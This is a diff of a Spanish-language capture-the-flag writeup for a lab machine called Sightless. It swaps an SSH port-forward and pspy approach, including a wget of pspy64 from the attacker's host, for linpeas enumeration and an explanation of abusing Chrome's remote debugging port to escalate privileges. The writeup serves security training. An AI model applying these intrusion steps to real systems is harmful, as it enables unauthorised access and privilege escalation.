@@ -16,7 +16,7 @@ image: https://github.com/user-attachments/assets/3369b1c5-339a-4c19-abb3-aa5b82
 * Cracking /etc/shadow users hashes to escape the container
 * Hydra brute force to validate passwords
 * Monitoring system process with pspy
-* SSH & Chisel Local Port Forwarding
+* Chisel Remote Port Forwarding
 
 ## Enumeration
 
@@ -306,64 +306,18 @@ michael
 
 ### Privilege escalation
 
-Utilizo el comando netstat para mostrar información sobre las conexiones de red y puertos en uso
+Utilizo la herramienta linpeas para intentar identificar posibles formas de escalar privilegios
 
 ```bash
-bash-5.1$ netstat -tulpen
-(Not all processes could be identified, non-owned process info
- will not be shown, you would have to be root to see it all.)
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        23267      -                   
-tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      115        26732      -                   
-tcp        0      0 127.0.0.1:33393         0.0.0.0:*               LISTEN      1001       27682      -                   
-tcp        0      0 127.0.0.1:54155         0.0.0.0:*               LISTEN      1001       27323      -                   
-tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      0          26734      -                   
-tcp        0      0 127.0.0.1:34031         0.0.0.0:*               LISTEN      0          25929      -                   
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      115        26352      -                   
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      0          25005      -                   
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          24983      -                   
-tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      0          25023      -                   
-tcp6       0      0 :::22                   :::*                    LISTEN      0          24985      -                   
-tcp6       0      0 :::21                   :::*                    LISTEN      116        25955      -                   
-udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        23266      -                   
-udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          23306      -
+michael@sightless:/tmp$ ./linpeas.sh > linout.txt
 ```
 
-Visualizo que se encuentra el puerto 8080 el cual no se veía en el escaneo de inicial de puertos, observo tambien que lo corre el usuario con UID 0, es decir root, utilizo ssh para realizar un local port forwarding y traer el puerto 8080 de la máquina a mi puerto 8080.
+En linpeas tenemos diferentes colores los cuales indican el nivel de importancia de lo que se reporta, analizando el archivo linout.txt puedo observar un RED/YELLOW lo que indica al 95% un vector de explotación potencial. Puedo observar que el usuario john esta corriendo el proceso /opt/google/chrome/chrome y se resalta el parámetro --remote-debugging-port=0.
 
-```bash
-ssh michael@10.10.11.32 -L 8080:127.0.0.1:8080 -N
-```
+![imagen](https://github.com/user-attachments/assets/da6173ef-1540-4e3a-ab91-5e4d2b93951f)
 
-Al acceder a http://127.0.0.1:8080 encuentro el panel de autenticación Froxlor pruebo con las credenciales obtenidas anteriormente pero niguna funciona
+Investigando averiguo que el parámetro --remote-debugging-port , habilita la depuración remota y un atacante podría acceder al navegador de forma remota y ejecutar comandos, acceder a la información de navegación, o incluso inyectar código JavaScript, el 0 indica que chrome elegirá aletoriamente un puerto disponible para habilitar la depuración remota.
 
-![imagen](https://github.com/user-attachments/assets/f8888229-125c-4cc1-8c32-f02bd5a77d35)
+* [Chrome Remote Debugger Pentesting](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)
 
-Utilzo pspy para monitorizar los todos los procesos del sistema sin necesidad de ser root
-
-```bash
-python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-```
-
-```bash
--bash-5.1$ wget http://10.10.14.160/pspy64
---2025-01-16 17:14:10--  http://10.10.14.160/pspy64
-Connecting to 10.10.14.160:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 3104768 (3.0M) [application/octet-stream]
-Saving to: 'pspy64
-```
-
-Analizando los procesos observo un proceso de Google Chrome con la opción --remote-debugging-port=0, pero el número de puerto 0 le dice al sistema que seleccione automáticamente un puerto disponible, esta característica está destinada a los desarrolladores a depurar de forma remota aplicaciones web conectando herramientas de desarrollo a la instancia del navegador. 
-
-```bash
-2025/01/16 16:47:03 CMD: UID=1001  PID=1571   | /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1522 --no-sandbox --disable-dev-shm-usage --enable-automation --remote-debugging-port=0 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1737000097220498 --launc
-```
-
-
-
-```bash
-
-```
+![imagen](https://github.com/user-attachments/assets/c1b18840-387c-40e3-9e4e-c046ee096793)
